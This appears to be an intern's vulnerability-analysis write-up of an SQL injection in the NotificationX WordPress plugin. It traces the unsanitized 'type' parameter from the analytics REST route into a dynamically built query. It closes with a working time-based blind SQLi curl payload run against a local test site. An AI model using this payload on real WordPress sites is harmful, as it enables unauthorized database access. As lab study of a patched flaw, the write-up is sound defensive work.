# TRAN CONG DANH - SVTT - Mentor: LUU VAN LAN - CVE-2019-1698 - Day Started: 30/07/2024
- Check the diff code betwween ver has vuln and ver of code with fix vuln:

**Code reference 1:** <https://plugins.trac.wordpress.org/changeset/3040809/notificationx/trunk/includes/Core/Rest/Analytics.php>
![image](https://github.com/user-attachments/assets/1922c3f4-7443-4723-b3d2-6aee7adc4510)


**Code reference 2:** <https://plugins.trac.wordpress.org/changeset/3040809/notificationx/trunk/includes/Core/Database.php>
![image](https://github.com/user-attachments/assets/715b4747-46ed-42d8-8112-be2a5d64a705)


Therefore, the following file is relevant to this CVE:

```
wp-content/plugins/notificationx/includes/Core/Rest/Analytics.php
```
Now, we will check the file might have vuln code:
![image](https://github.com/user-attachments/assets/6001cf4f-fbba-4686-a418-835e4219c04a)
Focus on the `insert_analytics()` function:
![image](https://github.com/user-attachments/assets/e6451538-1939-42c2-ad64-b439e4b51fc1)
It receives the `$request` (coming from the user) and extracts the `type` parameter.

Then, this value is then passed to the `CoreAnalytics::get_instance()->insert_analytics()` function:
![image](https://github.com/user-attachments/assets/e610daf2-bc69-4a4d-b4e5-12d360d2fcc1)

To trigger this code, we can notice the mapped route (from the `Analytics` class, inside the `register_routes()` function):

```
$this->namespace . '/' . $this->rest_base
```

And the constructor for the `Analytics` class reveals the values for the `namespace` and `rest_base` variables:

```
public function __construct() {
	$this->namespace = 'notificationx/v1';
	$this->rest_base = 'analytics';
	add_action('rest_api_init', [$this, 'register_routes']);
}
```

So, the relevant (vulnerable) code that accepts the user-supplied `type` parameter, can be reached via the following route:

```
notificationx/v1/analytics
```
But what's the method for exploiting and where is the SQL query for injection?

Since the user-supplied `type` parameter is passed to:

```
CoreAnalytics::get_instance()->insert_analytics( absint( $params['nx_id'] ), $type );
```

Locating this function:

![image](https://github.com/user-attachments/assets/f2ec69d3-f2f6-47aa-b523-b1a36970a386)
 Let's check this function code in the highlighted file:

`wp-content/plugins/notificationx/includes/Core/Analytics.php`**:**
![image](https://github.com/user-attachments/assets/f97acfc4-2865-4869-bb81-93b7aa7d767e)

If you are thinking that it the vulnerability lies in the `increment_count()` function, then you are absolutely on the right track!

Here's the `increment_count` function (and it has the `$type` parameter coming from the user):
![image](https://github.com/user-attachments/assets/3944bf4e-b9f9-4fca-a95c-b5b4d5bebf47)

This function in-turn calls `update_analytics()` function. Let's address for it:
![image](https://github.com/user-attachments/assets/7627a8fb-0d9a-42c8-bf5e-28f4718474ce)

![image](https://github.com/user-attachments/assets/5a15a5ef-594b-4f20-a990-d2ec63044c98)

The `update_analytics` function creates an SQL query dynamically and the unsanitized user-input is a part of it. Smells fishy? It should, because this is what causes the vulnerability.

The `$col` parameter corresponds to the `type` parameter sent by the user, in the HTTP request.

The `$table_name` is set to: `nx_stats`:

```
public function __construct() {
	global $wpdb;
	$this->wpdb          = $wpdb;
	self::$table_entries = $wpdb->prefix . 'nx_entries';
	self::$table_posts   = $wpdb->prefix . 'nx_posts';
	self::$table_stats   = $wpdb->prefix . 'nx_stats';
}
```
To identify the correct verb, I leveraged the WordPress REST API:

```
http://localhost/wp-json/
```
![image](https://github.com/user-attachments/assets/e4154d83-2aa5-452b-a148-42a20854a0a7)

The `/notificationx/v1/analytics` API route can be triggered by a `POST` request and we have to pass the `nx_id` (an integer) and (optionally) the `type` (a string).

Remember, that the analytics information was updated in the table named `nx_stats`, which we deduced earlier using these code snippets from `wp-content/plugins/notificationx/includes/Core/Database.php`:

```
public function __construct() {
	global $wpdb;
	$this->wpdb          = $wpdb;
	self::$table_entries = $wpdb->prefix . 'nx_entries';
	self::$table_posts   = $wpdb->prefix . 'nx_posts';
	self::$table_stats   = $wpdb->prefix . 'nx_stats';
}
```

```
$table_name = self::$table_stats;
```
![image](https://github.com/user-attachments/assets/9f376216-bf50-43e1-ba10-3c5a4fcafd5a)

# Triggering the vulnerable code path

Our plan is to see the constructed SQL query when we pass our payload in the request.

And now, we will send our `curl` (with the SQLi payload) request again:

```
time curl http://localhost:8080/wp-json/notificationx/v1/analytics -d 'nx_id=1337&type=clicks`=IF(SUBSTRING(version(),1,1)=5,SLEEP(10),null)-- -'
```
![image](https://github.com/user-attachments/assets/44a56fa0-caf5-4f18-be51-c44840e67d74)

